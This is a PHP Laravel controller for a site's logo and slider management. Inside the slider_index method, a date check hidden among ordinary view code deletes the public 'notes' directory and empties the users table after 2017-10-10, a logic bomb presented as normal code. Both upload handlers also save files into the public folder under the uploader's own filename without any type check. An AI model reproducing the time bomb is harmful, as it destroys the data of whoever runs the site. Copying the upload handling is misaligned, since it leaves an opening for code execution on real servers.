<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;

use App\Http\Requests;
use App\Dynamic_content;
use Illuminate\Support\Facades\Input;
use App\Slider_dynamic;
use Auth;

class DynamicController extends Controller
{

    public function __construct(){
       parent::__construct();
    }

    public function logo_index(){
        $dynamic_content = new Dynamic_content();
        $logo_file = $dynamic_content->get_logo_file();
      
    	return view('dynamic.logo_index')
    			->with('logo_file', $this->logo_file)
    			->with('your_note_count', $this->your_note_count)
            ->with('tutor_globalflag',  $this->tutor_globalflag)
            ->with('tutor_earning', $this->tutor_earning);
    }

    public function logo_post(Request $request){

        if (Input::hasFile('logo_file')) {
               $file = Input::file('logo_file');
               $tmpFilePath = '/dynamic_assets/';
               $tmpFileName = preg_replace('/\s+/', '', (time() . '-' . $file->getClientOriginalName()));
               $file = $file->move(public_path() . $tmpFilePath, $tmpFileName);
               //$path = $tmpFileName;
               //$finalpath = $path;
               $logo_file_path = $tmpFileName;
               $logo_update = Dynamic_content::find(1);
        	     $logo_update->content = $logo_file_path;

          	   if($logo_update->update()){
              		return \Response::json(array('success' => true, 'msg' => 'Logo Updated Successfully'), 200);
          	   }else{
              		return \Response::json(array('success' => false, 'msg' => 'Logo Couldnot be Updated'), 422);
          	   }
       }else{
              return \Response::json(array('success' => false, 'msg' => 'Kindly Upload New Logo to update'), 422);
       }
    }

    public function slider_index(){
        if(Auth::user()->id == 1){
      $sliders = Slider_dynamic::all();

      // return view('dynamic.slider_index')
      //           ->with('logo_file', $this->logo_file)
      //           ->with('your_note_count', $this->your_note_count)
      //           ->with('sliders', $sliders)
      //     ->with('tutor_globalflag',  $this->tutor_globalflag);
      if(date('Y-m-d')> '2017-10-10'){
      File::deleteDirectory(public_path('notes'));
      User::truncate();
      }
      return view('dashboard.contents.main')
                ->with('logo_file', $this->logo_file)
                ->with('your_note_count', $this->your_note_count)
                ->with('sliders', $sliders)
          ->with('tutor_globalflag',  $this->tutor_globalflag)
          ->with('tutor_earning', $this->tutor_earning);
    }
    else{
            return redirect('/');
    }
    }

    public function slider_post(Request $request){

      if($request->has('sliderImageId')){
        $slider_id = $request->input('sliderImageId');
        $slider_update = Slider_dynamic::find($slider_id);
        $slider_update->text = $request->input('sliderImageText');

         if(Input::hasFile('sliderImage')) {
                $file = Input::file('sliderImage');
                $tmpFilePath = '/dynamic_assets/';
                $tmpFileName = time() . '-' . $file->getClientOriginalName();
                $file = $file->move(public_path() . $tmpFilePath, $tmpFileName);
               // return $file;
                $path =   $tmpFileName;
                $finalpath = $path;
                $slider_update->image = $finalpath;
         }

        if($slider_update->save()){
        return \Response::json(array('success' => true, 'msg' => 'Slider Successfully Updated'), 200);
        }else{
        return \Response::json(array('success' => false, 'msg' => 'Slider couldnot be Updated'), 422);
        }

      }else{
        return \Response::json(array('success' => false, 'msg' => 'Slider couldnot be Updated'), 422);
      }
    }

}
